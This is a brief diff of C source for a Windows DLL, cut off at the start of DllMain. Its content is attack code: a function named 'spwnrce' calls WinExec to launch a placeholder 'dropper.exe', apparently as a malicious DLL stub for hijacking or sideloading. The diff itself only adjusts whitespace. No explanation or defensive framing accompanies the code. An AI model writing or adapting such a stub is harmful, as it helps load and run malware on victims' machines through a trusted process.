@@ -1,8 +1,9 @@
 #include <windows.h>
 
+
 void spwnrce()
 {
-    WinExec("C:\\PATH\\TO\\DROPPER\\dropper.exe",1);
+   WinExec("C:\\PATH\\TO\\DROPPER\\dropper.exe",1);
 }
 
 BOOL APIENTRY DllMain( HMODULE hModule,
